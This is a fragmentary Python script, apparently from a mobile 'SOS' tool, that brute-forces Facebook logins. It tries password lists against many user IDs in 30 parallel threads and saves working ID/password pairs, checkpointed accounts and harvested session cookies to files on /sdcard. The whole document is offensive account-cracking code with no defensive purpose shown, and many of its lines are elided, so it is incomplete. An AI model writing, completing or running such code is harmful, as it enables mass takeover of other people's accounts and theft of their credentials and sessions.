...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/SOS.txt \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        linex()
                                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/SOS-OK.TXT")
                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/SOS-CP.TXT")
                                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/SOS-COOKIE.TXT")
                                        linex()
...
def pak():
                ...
                with tred(max_workers=30) as SOS:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [SOS] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
                        ...
                        SOS=str(session.cookies)
                        if "c_user" in SOS:
                                print('\r\r\033[1;32m [SOS-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                print("Cookie: "+coki)
                                open('/sdcard/SOS-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/SOS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SOS:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SOS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SOS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SOS-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SOS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SOS-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/SOS-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/SOS-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [SOS-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SOS-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
